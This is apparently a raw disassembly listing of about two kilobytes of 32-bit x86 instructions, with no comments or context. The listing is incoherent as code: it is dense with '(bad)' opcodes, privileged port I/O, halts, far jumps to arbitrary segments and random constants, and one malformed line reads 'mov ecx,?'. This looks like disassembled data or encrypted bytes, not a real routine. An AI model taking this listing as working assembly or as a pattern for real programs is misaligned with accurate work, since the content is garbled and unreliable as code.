  4151de:	ins    DWORD PTR es:[edi],dx
  4151df:	dec    eax
  4151e0:	popf   
  4151e1:	test   DWORD PTR [eax+0x56],edx
  4151e4:	jecxz  0x4151af
  4151e6:	test   eax,0x8168ecf5
  4151eb:	ja     0x415190
  4151ed:	iret   
  4151ee:	jg     0x41521c
  4151f0:	outs   dx,DWORD PTR ds:[esi]
  4151f1:	lds    edi,FWORD PTR [esi-0x9]
  4151f4:	inc    ecx
  4151f5:	pop    edi
  4151f6:	adc    eax,0xeca36aed
  4151fb:	or     al,ch
  4151fd:	pushf  
  4151fe:	inc    edi
  4151ff:	pop    esi
  415200:	js     0x415209
  415202:	inc    edx
  415203:	int    0xbf
  415205:	mov    esi,0xdb205bc1
  41520a:	test   eax,0x11f87fe6
  41520f:	push   eax
  415210:	mov    al,ds:0x5005abca
  415215:	shr    DWORD PTR [esi+0x673e19ad],0x11
  41521c:	mov    ds:0xb2f1b6db,eax
  415221:	std    
  415222:	jno    0x4151cb
  415224:	scas   al,BYTE PTR es:[edi]
  415225:	mov    dl,dh
  415227:	icebp  
  415228:	push   0x73
  41522a:	pop    edi
  41522b:	cmp    al,0x1
  41522d:	je     0x415216
  41522f:	cmc    
  415230:	aas    
  415231:	stos   BYTE PTR es:[edi],al
  415232:	push   ss
  415233:	and    BYTE PTR [esi+0x41d811fc],ah
  415239:	into   
  41523a:	sbb    eax,0x1e35e6fc
  41523f:	pop    edi
  415240:	sub    ch,bl
  415242:	push   0x7f
  415244:	cmc    
  415245:	lds    ebp,FWORD PTR [ebp+0x5ba76b92]
  41524b:	cmp    eax,0xc4919070
  415250:	mov    bl,dl
  415252:	ror    DWORD PTR [eax],0x3b
  415255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415256:	in     eax,dx
  415257:	mov    gs,WORD PTR [ecx-0x3cdac4af]
  41525d:	fiadd  WORD PTR ds:0x67dc9a75
  415263:	aad    0x5b
  415265:	push   edx
  415266:	xor    al,0x4e
  415268:	clc    
  415269:	imul   eax,DWORD PTR [esi-0x15],0xffffff9c
  41526d:	adc    al,0xd5
  41526f:	push   es
  415270:	mov    WORD PTR [edx-0x36],cs
  415273:	popf   
  415274:	(bad)  
  415276:	stos   BYTE PTR es:[edi],al
  415277:	imul   esi,DWORD PTR gs:[edi+0x5dc2eecc],0xffffffc6
  41527f:	out    0x58,eax
  415281:	popa   
  415282:	xor    BYTE PTR [ebx-0x75],0xda
  415286:	mov    eax,0xd1cb77be
  41528b:	jmp    0x390d:0xec353685
  415292:	fwait
  415293:	dec    BYTE PTR [ebp+0x5f9bd851]
  415299:	lahf   
  41529a:	cmp    BYTE PTR [ecx],dh
  41529c:	test   al,0xf2
  41529e:	jge    0x41529c
  4152a0:	mov    ds:0x90f388c3,eax
  4152a5:	out    dx,al
  4152a6:	jp     0x415291
  4152a8:	stos   BYTE PTR es:[edi],al
  4152a9:	cmc    
  4152aa:	repnz ss mov cl,0xde
  4152ae:	loopne 0x4152bc
  4152b0:	iret   
  4152b1:	dec    edx
  4152b2:	call   0x6fedd1b2
  4152b7:	in     eax,dx
  4152b8:	lods   al,BYTE PTR ds:[esi]
  4152b9:	push   edi
  4152ba:	mov    eax,ds:0xc79b113
  4152bf:	add    al,0x9a
  4152c1:	mov    ah,0xa
  4152c3:	icebp  
  4152c4:	iret   
  4152c5:	cmp    eax,DWORD PTR [edi]
  4152c7:	aad    0x8a
  4152c9:	and    al,0x83
  4152cb:	mov    ebx,0x17522626
  4152d0:	std    
  4152d1:	jecxz  0x415312
  4152d3:	push   ebp
  4152d4:	(bad)  
  4152d5:	dec    edx
  4152d6:	inc    edi
  4152d7:	arpl   WORD PTR [edi],ax
  4152d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152da:	pop    esi
  4152db:	rol    DWORD PTR [ecx+eiz*1-0x2c51e3df],1
  4152e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152e4:	aad    0x63
  4152e6:	sbb    BYTE PTR fs:[edx+ecx*8+0x2c1e4b08],al
  4152ee:	leave  
  4152ef:	hlt    
  4152f0:	dec    eax
  4152f1:	ret    0x5649
  4152f4:	xchg   ebp,eax
  4152f5:	test   DWORD PTR [ecx],ebp
  4152f7:	mov    bh,0xe1
  4152f9:	inc    ebp
  4152fa:	hlt    
  4152fb:	test   al,0x89
  4152fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152fe:	aam    0x90
  415300:	jl     0x41529c
  415302:	xchg   ebx,eax
  415303:	jecxz  0x4152e0
  415305:	ret    
  415306:	out    dx,eax
  415307:	xchg   edi,eax
  415308:	dec    edi
  415309:	dec    esi
  41530a:	jp     0x415339
  41530c:	mov    dh,0x97
  41530e:	pusha  
  41530f:	push   cs
  415310:	add    eax,0x357ee273
  415315:	int    0x53
  415317:	inc    ebp
  415318:	and    DWORD PTR [ebp+0x25],edx
  41531b:	call   0x77a1c2ed
  415320:	push   es
  415321:	in     eax,dx
  415322:	inc    edi
  415323:	xchg   ah,dh
  415325:	popf   
  415326:	xor    DWORD PTR [eax-0x13b38317],0x3e7e050
  415330:	push   ebx
  415331:	test   eax,0x8e8ef5c4
  415336:	xor    BYTE PTR [edi-0x415223f5],ah
  41533c:	push   cs
  41533d:	ret    0xdacb
  415340:	stos   BYTE PTR es:[edi],al
  415341:	sub    DWORD PTR [ecx],0x71c945a9
  415347:	in     eax,dx
  415348:	cmp    eax,0x25d155b0
  41534d:	fisub  DWORD PTR [esp+edx*1-0x24]
  415351:	jb     0x4153a3
  415353:	push   esp
  415354:	jmp    0x415348
  415356:	xor    eax,0xe3e97e6c
  41535b:	es push ss
  41535d:	push   ebp
  41535e:	out    dx,al
  41535f:	bound  ecx,QWORD PTR es:0x27336933
  415366:	jge    0x4153ad
  415368:	inc    ebp
  415369:	push   eax
  41536a:	jmp    0xa660:0x19f0994
  415371:	lock cmp eax,0x45
  415375:	rol    DWORD PTR [edx+0x2a1a413b],1
  41537b:	sti    
  41537c:	adc    al,0x80
  41537e:	nop
  41537f:	je     0x41534e
  415381:	and    esp,eax
  415383:	or     cl,bh
  415385:	dec    ecx
  415386:	xchg   edx,eax
  415387:	inc    BYTE PTR ds:0xaa2799e2
  41538d:	hlt    
  41538e:	dec    eax
  41538f:	inc    eax
  415390:	or     cl,BYTE PTR [edi+0x61]
  415393:	iret   
  415394:	mov    BYTE PTR [eax-0x6d91a5aa],dl
  41539a:	and    esi,DWORD PTR [edi]
  41539c:	into   
  41539d:	repz jl 0x415415
  4153a0:	ins    BYTE PTR es:[edi],dx
  4153a1:	mov    dl,0x79
  4153a3:	fisub  WORD PTR [esi-0x393ee410]
  4153a9:	pop    ss
  4153aa:	out    dx,eax
  4153ab:	fmul   QWORD PTR [ebp+0x27]
  4153ae:	and    al,0x3e
  4153b0:	je     0x415366
  4153b2:	rcl    ch,cl
  4153b4:	in     eax,dx
  4153b5:	loop   0x415350
  4153b7:	sub    al,0xd1
  4153b9:	retf   
  4153ba:	mov    edx,0x1674515a
  4153bf:	sbb    DWORD PTR [ecx+0x1],ecx
  4153c2:	aaa    
  4153c3:	dec    ebx
  4153c4:	and    ecx,ebp
  4153c6:	aad    0x81
  4153c8:	scas   eax,DWORD PTR es:[edi]
  4153c9:	pusha  
  4153ca:	mov    edx,0xd63cad4c
  4153cf:	pop    esi
  4153d0:	dec    esp
  4153d1:	shl    BYTE PTR [ebp-0x4e953d36],1
  4153d7:	push   0xffffffb0
  4153d9:	inc    ebp
  4153da:	adc    eax,0xfb47b960
  4153df:	inc    esp
  4153e0:	out    dx,eax
  4153e1:	jmp    0x415378
  4153e3:	or     eax,0x1ae6b50
  4153e8:	les    ebp,FWORD PTR [edi]
  4153ea:	add    eax,0x62193c34
  4153ef:	jne    0x4153bc
  4153f1:	inc    ebx
  4153f2:	cmp    ebp,edi
  4153f4:	pushf  
  4153f5:	jmp    0xf1bc:0xd5b6d6a9
  4153fc:	or     DWORD PTR [esp+ebp*8+0xe916de3],ecx
  415403:	jmp    0x41542c
  415405:	stc    
  415406:	js     0x41543a
  415408:	mov    esp,0xe1e6781b
  41540d:	mov    bl,0x70
  41540f:	test   al,0xc6
  415411:	(bad)  
  415412:	jecxz  0x41545e
  415414:	shr    BYTE PTR [ebp-0x4792a790],1
  41541a:	push   edx
  41541b:	push   es
  41541c:	sub    DWORD PTR [ecx],ebp
  41541e:	scas   eax,DWORD PTR es:[edi]
  41541f:	loopne 0x415471
  415421:	outs   dx,BYTE PTR ds:[esi]
  415422:	and    DWORD PTR [esi],esp
  415424:	mov    bh,BYTE PTR [ecx+edi*1]
  415427:	push   0xffffffbb
  415429:	push   eax
  41542a:	or     edx,DWORD PTR [edx]
  41542c:	inc    esi
  41542d:	mov    ecx,?
  41542f:	test   DWORD PTR [ebx+0x396cc4b4],esi
  415435:	neg    BYTE PTR [ecx+0x40cfdc3]
  41543b:	xchg   ebx,eax
  41543c:	mov    cl,0xe2
  41543e:	sub    al,0xcb
  415440:	adc    al,0x4c
  415442:	f2xm1  
  415444:	fwait
  415445:	or     ebp,DWORD PTR ds:0x9326ff06
  41544b:	ins    BYTE PTR es:[edi],dx
  41544c:	ins    BYTE PTR es:[edi],dx
  41544d:	or     esp,ecx
  41544f:	out    0x23,eax
  415451:	push   eax
  415452:	icebp  
  415453:	ret    0x7d0b
  415456:	fst    QWORD PTR ds:[ecx+0xb6e901]
  41545d:	stc    
  41545e:	mov    edx,0x4ebb8b36
  415463:	inc    esi
  415464:	add    edi,esp
  415466:	mov    ds:0x2650e82f,eax
  41546b:	push   eax
  41546c:	push   ebx
  41546d:	push   edi
  41546e:	jle    0x4154cd
  415470:	add    edi,edi
  415472:	cmc    
  415473:	ss in  al,0xf2
  415476:	retf   
  415477:	dec    ebx
  415478:	bound  edx,QWORD PTR [edi-0x67]
  41547b:	aas    
  41547c:	es and BYTE PTR es:[ebx+0x7a1d300c],0xda
  415485:	loopne 0x41545e
  415487:	mov    esp,0x45c20bd9
  41548c:	dec    eax
  41548d:	or     eax,0x740583d5
  415492:	call   0xec7dbc91
  415497:	stos   DWORD PTR es:[edi],eax
  415498:	cmp    BYTE PTR [esi],0xd3
  41549b:	fcomp  QWORD PTR [edx+ebx*8+0x1963ef2a]
  4154a2:	add    BYTE PTR [eax+ebx*2-0x7e],ch
  4154a6:	call   esi
  4154a8:	test   BYTE PTR [ebp+0x1099093f],dh
  4154ae:	mov    al,0x6b
  4154b0:	out    dx,eax
  4154b1:	dec    esp
  4154b2:	iret   
  4154b3:	or     BYTE PTR [eax+0x7702df4],ah
  4154b9:	nop
  4154ba:	jg     0x415532
  4154bc:	xchg   edi,eax
  4154bd:	sti    
  4154be:	inc    edx
  4154bf:	jg     0x415505
  4154c1:	dec    ebp
  4154c2:	inc    esi
  4154c3:	sbb    esp,ecx
  4154c5:	out    dx,al
  4154c6:	jle    0x41553a
  4154c8:	pop    ebp
  4154c9:	(bad)
  4154cc:	pop    edi
  4154cd:	fs jge 0x4154a1
  4154d0:	test   al,0xc5
  4154d2:	(bad)  
  4154d3:	and    al,0x41
  4154d5:	loope  0x415463
  4154d7:	hlt    
  4154d8:	push   esi
  4154d9:	push   edx
  4154da:	push   edi
  4154db:	xchg   DWORD PTR [ecx+0x31],edx
  4154de:	or     DWORD PTR [edx+0x65],eax
  4154e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154e2:	mov    edx,0xd29880d0
  4154e7:	dec    edi
  4154e8:	and    bl,BYTE PTR [ecx]
  4154ea:	ror    BYTE PTR [edx-0x10],0x5c
  4154ee:	mov    eax,gs:0xf3dfc990
  4154f4:	dec    ebp
  4154f5:	push   edi
  4154f6:	xchg   esp,eax
  4154f7:	cmp    BYTE PTR [esi-0x7d],bl
  4154fa:	pop    esi
  4154fb:	xor    DWORD PTR [ecx-0x5f09fb59],edx
  415501:	(bad)  
  415502:	jl     0x415551
  415504:	les    edi,FWORD PTR [ebx+ebx*8-0x7d116997]
  41550b:	jnp    0x4154a7
  41550d:	pop    esp
  41550e:	add    dl,BYTE PTR [ebp+edi*8+0x39]
  415512:	jae    0x415573
  415514:	fdiv   DWORD PTR [edx+0x30ca8f0]
  41551a:	add    ebx,DWORD PTR [edx+0x37]
  41551d:	xchg   edx,eax
  41551e:	outs   dx,BYTE PTR ds:[esi]
  41551f:	mov    BYTE PTR [esi-0x1bcdba22],dh
  415525:	inc    ebx
  415526:	and    DWORD PTR [edi],eax
  415528:	add    al,0x4c
  41552a:	push   ebx
  41552b:	fsub   QWORD PTR [ebx]
  41552d:	outs   dx,BYTE PTR ds:[esi]
  41552e:	addr16 hlt 
  415530:	dec    esp
  415531:	push   esp
  415532:	cdq    
  415533:	push   es
  415534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415535:	mov    gs,WORD PTR [eax+0x4f0be2d0]
  41553b:	stc    
  41553c:	imul   DWORD PTR [eax]
  41553e:	mov    al,0x5b
  415540:	mov    BYTE PTR [eax],ch
  415542:	xor    ch,ah
  415544:	push   ebx
  415545:	xchg   BYTE PTR [eax+0x1b],al
  415548:	fwait
  415549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41554a:	or     DWORD PTR [edi-0x34],0xffffffaf
  41554e:	gs jmp 0xa84:0x81447003
  415556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415557:	pop    esi
  415558:	addr16 out dx,al
  41555a:	add    eax,0x30cf2ffa
  41555f:	cmp    dl,al
  415561:	and    bl,BYTE PTR [eax-0x39]
  415564:	jb     0x415598
  415566:	pop    ecx
  415567:	and    DWORD PTR [ebp-0x73812411],0xfffffff0
  41556e:	adc    eax,0x2b0c9884
  415573:	xor    eax,0xb940e882
  415578:	push   ecx
  415579:	rcr    BYTE PTR [ebx],0x86
  41557c:	pop    ebx
  41557d:	mul    DWORD PTR [esi+eax*1+0x4524484b]
  415584:	xor    eax,0x6383a7b
  415589:	dec    ebx
  41558a:	dec    ebp
  41558b:	cdq    
  41558c:	js     0x41557d
  41558e:	or     eax,0xd14b7d99
  415593:	cmp    eax,0x8ce9fca7
  415598:	adc    DWORD PTR [ebp+0x3e1f7dfb],esi
  41559e:	test   DWORD PTR [ebp+0x2c99b05e],esp
  4155a4:	imul   ebp,esi,0x94c26d52
  4155aa:	not    esi
  4155ac:	mov    ah,0xf8
  4155ae:	jne    0x41562c
  4155b0:	loopne 0x4155eb
  4155b2:	hlt    
  4155b3:	ins    DWORD PTR es:[edi],dx
  4155b4:	call   0x3481:0xbd051c2e
  4155bb:	retf   
  4155bc:	aad    0x7b
  4155be:	sub    al,BYTE PTR [ebx-0x6]
  4155c1:	outs   dx,DWORD PTR ds:[esi]
  4155c2:	jmp    FWORD PTR [eax-0x20]
  4155c5:	push   edi
  4155c6:	shl    DWORD PTR [edx+0x40],1
  4155c9:	sub    al,ah
  4155cb:	rol    BYTE PTR [esi+esi*1-0x11],cl
  4155cf:	push   ecx
  4155d0:	push   ss
  4155d1:	int    0xb4
  4155d3:	mov    WORD PTR [ebp+eiz*1+0x72],ds
  4155d7:	xchg   esi,eax
  4155d9:	mov    ds,eax
  4155db:	in     eax,0x79
  4155dd:	add    al,0xb8
  4155df:	test   DWORD PTR [edx+ecx*1+0x1777752],0xc9f6db4a
  4155ea:	jmp    0x673e2c4d
  4155ef:	adc    DWORD PTR [edi+0x13],esp
  4155f2:	repz xor DWORD PTR ss:0x73fad86c,ecx
  4155fa:	dec    edx
  4155fb:	mov    dl,0xa6
  4155fd:	ins    DWORD PTR es:[edi],dx
  4155fe:	daa    
  4155ff:	mov    al,ds:0xc6b0ebce
  415604:	(bad)  
  415606:	jmp    0x456dacb3
  41560b:	or     al,0xab
  41560d:	mov    eax,0xe568b8d8
  415612:	xchg   esi,eax
  415613:	inc    esp
  415614:	in     al,dx
  415615:	pop    edi
  415616:	mov    al,0x3a
  415618:	fidivr DWORD PTR [ecx+0x2a79ea1a]
  41561e:	lahf   
  41561f:	add    DWORD PTR [esi+0x789a1e78],eax
  415625:	dec    edi
  415626:	mov    ebp,0x7559ba48
  41562b:	mov    ebx,0xb5704234
  415630:	aad    0xea
  415632:	or     DWORD PTR [eax],ebp
  415634:	(bad)  
  415635:	popf   
  415636:	out    0xf4,eax
  415638:	push   esi
  415639:	mov    esi,es
  41563b:	lods   eax,DWORD PTR ds:[esi]
  41563c:	push   esi
  41563d:	call   0xb519b12a
  415642:	sub    BYTE PTR gs:[ebx],0x19
  415646:	cld    
  415647:	pop    ss
  415648:	mov    eax,0x3edd9ffb
  41564d:	test   BYTE PTR [ebx-0x1ce36ce5],0x7a
  415654:	std    
  415655:	outs   dx,BYTE PTR ds:[esi]
  415656:	imul   DWORD PTR [ebx]
  415658:	pop    eax
  415659:	and    bl,dl
  41565b:	sbb    al,0xfe
  41565d:	pop    es
  41565e:	loope  0x415634
  415660:	add    eax,0x6a9650c6
  415665:	add    BYTE PTR [eax],ch
  415667:	sbb    ebx,esi
  415669:	(bad)  
  41566a:	jmp    0x4155f8
  41566c:	sbb    esp,DWORD PTR [edx]
  41566e:	sub    esp,ebx
  415670:	inc    ecx
  415671:	(bad)  
  415672:	sbb    al,0x96
  415674:	scas   eax,DWORD PTR es:[edi]
  415675:	nop    DWORD PTR [edx-0x4c]
  415679:	das    
  41567a:	(bad)  
  41567b:	lods   al,BYTE PTR ds:[esi]
  41567c:	jp     0x4156a1
  41567e:	sbb    esi,ecx
  415680:	jns    0x415701
  415682:	mov    al,0x82
  415684:	adc    BYTE PTR [edx+ecx*8-0x6f112bce],dl
  41568b:	outs   dx,BYTE PTR ds:[esi]
  41568c:	les    eax,FWORD PTR [ebx+0x68]
  41568f:	push   0xa5df8116
  415694:	ror    DWORD PTR [edi],1
  415696:	add    al,0xdd
  415698:	or     ebp,DWORD PTR ds:0x6adc5ec4
  41569e:	or     al,0xb8
  4156a0:	cmc    
  4156a1:	js     0x415627
  4156a3:	aaa    
  4156a4:	scas   al,BYTE PTR es:[edi]
  4156a5:	outs   dx,BYTE PTR ds:[esi]
  4156a6:	add    al,0x2d
  4156a8:	sbb    DWORD PTR [ecx],0xc68b6877
  4156ae:	sub    eax,0x16430361
  4156b3:	sub    ah,BYTE PTR [edi]
  4156b5:	shl    BYTE PTR [ebx+ebp*4],1
  4156b8:	scas   eax,DWORD PTR es:[edi]
  4156b9:	lods   al,BYTE PTR ds:[esi]
  4156ba:	imul   eax,edi,0x77444e76
  4156c0:	pop    bx
  4156c2:	test   BYTE PTR [ebx+0x69b97349],dh
  4156c8:	mov    edi,0xd21cd8d6
  4156cd:	sub    eax,0xe9798f46
  4156d2:	add    edi,0x7dda9361
  4156d8:	ja     0x4156e3
  4156da:	pop    edi
  4156db:	lock arpl WORD PTR [ebx+0x75],sp
  4156df:	adc    al,bh
  4156e1:	xor    ecx,DWORD PTR [edi-0x3b]
  4156e4:	jmp    0xddf8cebd
  4156e9:	jbe    0x415767
  4156eb:	mov    BYTE PTR [edx+0x6b601c5e],al
  4156f1:	or     cl,dh
  4156f3:	imul   esi,DWORD PTR [ebx-0x607f6bd9],0x4
  4156fa:	and    ch,dh
  4156fc:	(bad)  
  4156fd:	jno    0x4156b9
  4156ff:	arpl   WORD PTR [ebx+eiz*1+0x7a9fe574],bp
  415706:	mov    edi,0x7e145f5b
  41570b:	outs   dx,DWORD PTR ds:[esi]
  41570c:	adc    eax,0x43f7b968
  415711:	sti    
  415712:	or     al,BYTE PTR [edi-0x2b19eb7a]
  415718:	ins    DWORD PTR es:[edi],dx
  415719:	sbb    al,BYTE PTR [ebp-0x2b604928]
  41571f:	inc    eax
  415720:	mov    al,0x91
  415722:	inc    ecx
  415723:	mov    ss,eax
  415725:	add    eax,esi
  415727:	fdiv   QWORD PTR [ebx]
  415729:	ss mov ebp,0xcb436a3d
  41572f:	xor    eax,0xe1cb9034
  415734:	outs   dx,BYTE PTR ds:[esi]
  415735:	int    0xe4
  415737:	add    BYTE PTR [eax+0x5a7d38f2],al
  41573d:	mov    ecx,0xae89ff19
  415742:	in     al,dx
  415743:	or     DWORD PTR [ebx-0x33],eax
  415746:	xlat   BYTE PTR ds:[ebx]
  415747:	icebp  
  415748:	mov    dl,BYTE PTR [ebp+0x20]
  41574b:	adc    eax,0x5ed9d791
  415750:	jge    0x4156dc
  415752:	cmp    DWORD PTR [ebx-0x53],ebx
  415755:	mov    dl,0x1
  415757:	xchg   ebx,eax
  415758:	xchg   DWORD PTR [eax-0x67],esi
  41575b:	ret    
  41575c:	sbb    eax,0x7b5fe486
  415761:	push   ds
  415762:	out    0x1b,al
  415764:	jne    0x4157db
  415766:	xchg   ebx,eax
  415767:	xchg   edi,eax
  415768:	pop    ds
  415769:	addr16 mov al,ds:0xe889
  41576d:	dec    sp
  41576f:	int    0xb4
  415771:	loop   0x4157ed
  415773:	sbb    ch,al
  415775:	sar    BYTE PTR [ebp+0x51fa6f26],cl
  41577b:	push   ebx
  41577c:	mov    BYTE PTR [ebx-0x36b5ca35],dl
  415782:	stc    
  415783:	jmp    0xd79b:0x79d8311f
  41578a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41578b:	out    dx,eax
  41578c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41578d:	xor    ah,BYTE PTR gs:[ebp+0xd]
  415791:	jnp    0x41576d
  415793:	(bad)  
  415794:	in     eax,dx
  415795:	jnp    0x415752
  415797:	adc    bl,dh
  415799:	aad    0x3d
  41579b:	in     al,dx
  41579c:	and    eax,0x657df795
  4157a1:	stc    
  4157a2:	stc    
  4157a3:	inc    eax
  4157a4:	test   DWORD PTR [esi+edx*2],edi
  4157a7:	push   edi
  4157a8:	sub    edx,DWORD PTR [edi+0x42]
  4157ab:	sar    BYTE PTR [ebx+ebp*1-0x2c1f5e2b],1
  4157b2:	mov    esp,0x7ec09c8e
  4157b7:	cs jmp 0xf9a8852c
  4157bd:	mov    ebx,0x8c1653e1
  4157c2:	(bad)  
  4157c3:	fdivr  st(7),st
  4157c5:	inc    esp
  4157c6:	lea    esi,[eax-0x4d]
  4157c9:	cmp    DWORD PTR [ecx+ebp*4+0x677ab5b1],ebx
  4157d0:	inc    BYTE PTR [esi]
  4157d2:	pop    ebp
  4157d3:	fisttp QWORD PTR [eax+0x3d]
  4157d6:	sbb    cl,BYTE PTR [eax-0x8]
  4157d9:	not    BYTE PTR [ebp-0x62]
  4157dc:	push   esi
  4157dd:	inc    ebp
  4157de:	inc    edx
  4157df:	mov    ebp,DWORD PTR [eax+ecx*1-0x77]
  4157e3:	xchg   DWORD PTR ds:[edi],esi
  4157e6:	or     al,0x5
  4157e8:	cmp    al,0xcd
  4157ea:	rcl    BYTE PTR [ebx+ecx*2+0x1b],cl
  4157ee:	inc    ecx
  4157ef:	out    0x13,eax
  4157f1:	push   ebx
  4157f2:	sbb    al,0x5
  4157f4:	sbb    DWORD PTR [edx-0x65],edi
  4157f7:	call   0x962b:0x5d48d3d8
  4157fe:	dec    edx
  4157ff:	adc    DWORD PTR [ecx-0x83bef0f],ebx
  415805:	cmp    dl,dl
  415807:	xchg   DWORD PTR [ebp-0x9b58a9f],edi
  41580d:	add    DWORD PTR [ebp-0x4194d52b],ebp
  415813:	cld    
  415814:	fsub   QWORD PTR [eiz*1+0x6d7bbfb]
  41581b:	dec    edx
  41581c:	icebp  
  41581d:	xor    al,0x58
  41581f:	or     BYTE PTR [eax-0x6f099c8c],cl
  415825:	frstor [esp+esi*1+0x566e7f0c]
  41582c:	outs   dx,BYTE PTR ds:[esi]
  41582d:	or     eax,0xe355f2
  415832:	mov    eax,0xfa1322ba
  415837:	sub    DWORD PTR [eax+ebx*2+0x33],esp
  41583b:	leave  
  41583c:	pushf  
  41583d:	xchg   BYTE PTR ds:0x1e03237e,cl
  415843:	lahf   
  415844:	or     eax,edi
  415846:	(bad)  
  415848:	mov    ds:0x7f6d1bd2,eax
  41584d:	push   DWORD PTR [esi+0x77]
  415850:	sub    eax,0x846eaa54
  415855:	call   0xff83:0x7a7240e1
  41585c:	mov    al,ds:0xdadc47d4
  415861:	into   
  415862:	shr    BYTE PTR [esi+0x5ba35517],1
  415868:	xor    al,0x6d
  41586a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41586c:	int3   
  41586d:	cmp    al,0xfd
  41586f:	retf   0x841e
  415872:	aaa    
  415873:	push   0x77c413de
  415878:	retf   
  415879:	mov    edx,DWORD PTR [ecx-0x71a02b7a]
  41587f:	jp     0x41581e
  415881:	bound  ebp,QWORD PTR [ecx]
  415883:	or     eax,0x48417f87
  415888:	and    eax,0xd471a298
  41588d:	call   0xbde2:0xd0043750
  415894:	shl    DWORD PTR [ebx+0x35],0xbd
  415898:	repz int3 
  41589a:	lahf   
  41589b:	mov    eax,ds:0xaea9582
  4158a0:	mov    ah,0x23
  4158a2:	sbb    ebx,DWORD PTR [esp+edi*1-0x2bcf786b]
  4158a9:	cmp    BYTE PTR [ecx],ch
  4158ab:	pop    ds
  4158ac:	adc    BYTE PTR [edi+0x5b370211],dh
  4158b2:	in     eax,0xdc
  4158b4:	xchg   edx,eax
  4158b5:	(bad)  
  4158b6:	cmp    ah,dl
  4158b8:	aas    
  4158b9:	dec    eax
  4158ba:	sub    eax,0x298261a0
  4158bf:	cmc    
  4158c0:	push   edi
  4158c1:	cmc    
  4158c2:	shr    DWORD PTR [ebp+0x79],1
  4158c5:	popa   
  4158c6:	cmovnp ebp,DWORD PTR [edi+0x77]
  4158ca:	adc    dl,BYTE PTR ds:0xb7879ee7
  4158d0:	scas   al,BYTE PTR es:[edi]
  4158d1:	jecxz  0x41588f
  4158d3:	adc    BYTE PTR [esi-0x4f],0x3d
  4158d7:	pop    ebx
  4158d8:	mov    cs,WORD PTR [edx]
  4158da:	out    0x25,al
  4158dc:	test   BYTE PTR [edx-0x29],cl
  4158df:	push   ecx
  4158e0:	inc    ebx
  4158e1:	xchg   edi,eax
  4158e2:	jo     0x4158c1
  4158e4:	pop    esp
  4158e5:	push   esp
  4158e6:	inc    esp
  4158e7:	adc    DWORD PTR [esi],edx
  4158e9:	jno    0x415946
  4158eb:	shl    DWORD PTR [esi+0x20],0xfb
  4158ef:	and    DWORD PTR ds:0xd78c74db,esi
  4158f5:	sub    al,BYTE PTR [ebp+0x6e]
  4158f8:	inc    edi
  4158f9:	ins    BYTE PTR es:[edi],dx
  4158fa:	(bad)  
  4158fb:	mov    edx,DWORD PTR [ebx+0x6f]
  4158fe:	addr16 sbb eax,0x663d948
  415904:	ins    DWORD PTR es:[edi],dx
  415905:	fdivp  st(0),st
  415907:	inc    edi
  415908:	sub    edi,DWORD PTR [ecx+ebx*1]
  41590b:	in     eax,0x65
  41590d:	push   eax
  41590e:	mov    esp,DWORD PTR [edi-0x38]
  415911:	rcl    bl,1
  415913:	shl    DWORD PTR [esi],cl
  415915:	sar    BYTE PTR [ecx-0x12e07078],cl
  41591b:	cmp    cl,BYTE PTR [esi-0x18cb5ce7]
  415921:	ins    DWORD PTR es:[edi],dx
  415922:	sbb    ah,cl
  415924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415925:	pop    ds
  415926:	fimul  DWORD PTR [edi]
  415928:	fldenv [edx-0x6e]
  41592b:	(bad)  
  41592c:	in     eax,0x1a
  41592e:	ret    
  41592f:	jns    0x41599d
  415931:	leave  
  415932:	jo     0x4158d0
  415934:	push   cs
  415935:	ja     0x41597d
  415937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415938:	push   ebx
  415939:	sbb    dl,bh
  41593b:	inc    edx
  41593c:	or     eax,0x710d439d
  415941:	adc    BYTE PTR [eax+0x3bca5732],al
  415947:	into   
  415948:	rol    DWORD PTR [edx+0x6e307cbb],cl
  41594e:	neg    BYTE PTR [esi-0x6648d767]
  415954:	jb     0x415970
  415956:	cmp    BYTE PTR [edi],cl
  415958:	mov    bl,0x34
  41595a:	lock std 
  41595c:	fisub  WORD PTR [ecx+0x25]
  41595f:	inc    ecx
  415960:	aam    0xed
  415962:	sub    dh,dl
  415964:	les    edi,FWORD PTR [ebx]
  415966:	push   esp
  415967:	pop    esp
  415968:	pusha  
  415969:	push   ebp
  41596a:	mov    ebx,0x33694152
  41596f:	shl    DWORD PTR [edi],1
  415971:	sahf   
  415972:	mov    ah,0x1
  415974:	xchg   edx,eax
  415975:	jbe    0x4159cb
  415977:	dec    ebx
  415978:	ins    BYTE PTR es:[edi],dx
  415979:	dec    BYTE PTR [eax-0x15f4ef5]
  41597f:	mov    edx,0x5f3b09bf
  415984:	cmp    ch,BYTE PTR [edi+0x52]
  415987:	jl     0x4159a3
  415989:	mov    bl,0x94
  41598b:	xchg   ebx,eax
  41598c:	jmp    0x41594c
  41598e:	dec    edi
  41598f:	in     eax,0x1d
  415991:	stos   DWORD PTR es:[edi],eax
  415992:	ret    
  415993:	adc    DWORD PTR [ecx+0x4be36ed4],0xe34bc91d
  41599d:	js     0x415952
  41599f:	mov    eax,ds:0x601bd5bc
  4159a4:	aam    0xaa
  4159a6:	adc    eax,0x92541d23
  4159ab:	stc    
  4159ac:	push   esp
  4159ad:	mov    BYTE PTR [esi],ch
  4159af:	fild   DWORD PTR ds:0x77179751
  4159b5:	(bad)  
  4159b6:	loopne 0x415a1e
  4159b8:	mov    WORD PTR [edx-0x7db6496e],es
  4159be:	mov    ds:0xfbe62f56,al
  4159c3:	repz daa 
  4159c5:	push   cs
  4159c6:	mov    ch,0xb
  4159c8:	or     eax,0x143e33cd
  4159cd:	test   DWORD PTR [edi],edi
  4159cf:	adc    al,0xb3
  4159d1:	mov    al,0xa1
  4159d3:	inc    ecx
  4159d4:	call   0x39b56c95
